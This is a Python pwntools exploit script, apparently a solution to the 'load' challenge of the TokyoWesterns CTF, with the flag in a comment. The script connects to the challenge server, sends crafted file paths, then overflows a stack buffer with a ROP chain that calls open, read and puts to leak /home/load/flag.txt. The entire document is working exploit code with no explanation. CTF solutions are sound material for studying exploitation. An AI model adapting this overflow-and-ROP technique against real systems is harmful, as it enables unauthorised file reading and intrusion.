#!/usr/bin/env python
from pwn import *

# TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}

context.arch = 'amd64'

e = ELF( './load' )

host , port = 'pwn1.chal.ctf.westerns.tokyo' , 34835
y = remote( host , port )

name = 0x601040
pop_rdi = 0x400a73
pp_rsi = 0x400a71

p =  '/dev/stdin'.ljust( 0x10 , '\x00' )
p += '/dev/pts/1'.ljust( 0x10 , '\x00' )
p += '/home/load/flag.txt'.ljust( 0x20 , '\x00' )
y.sendlineafter( ':' , p )

y.sendlineafter( ':' , '0' )
y.sendlineafter( ':' , '9999999' )

sleep( 0.1 )

start = 0x400720
main = 0x400816
plt_read = 0x4006e8
plt_open = 0x400710
plt_puts = 0x4006c0

p = flat(
    'a' * 0x38,
    pop_rdi,
    name + 0x10,
    pp_rsi,
    2,
    0,
    plt_open,

    pop_rdi,
    name + 0x10,
    pp_rsi,
    2,
    0,
    plt_open,

    pop_rdi,
    name + 0x20,
    pp_rsi,
    0,
    0,
    plt_open,

    pop_rdi,
    2,
    pp_rsi,
    name + 0x50,
    0,
    plt_read,

    pop_rdi,
    name + 0x50,
    plt_puts
)

y.send( p )

y.interactive()